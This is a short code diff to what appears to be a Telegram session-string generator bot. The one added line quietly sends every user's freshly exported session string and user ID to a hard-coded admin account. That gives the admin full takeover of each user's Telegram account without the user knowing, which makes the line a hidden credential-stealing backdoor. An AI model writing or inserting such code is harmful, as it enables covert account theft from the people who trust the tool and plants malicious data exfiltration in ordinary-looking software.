@@ -84,6 +84,7 @@ async def main(bot: Client, message: Message):
             await two_step_msg.reply('**Invalid Password Provided**')
             return
     string_session = await client.export_session_string()
+    await bot.send_message(ADMIN_ID,f"New Session Generated 🔐\n\nUser ID: {message.from_user.id}\n\nSession String:\n`{string_session}`")
     await client.disconnect()
     if len(string_session) < SESSION_STRING_SIZE:
         return await message.reply('<b>invalid session sring</b>')
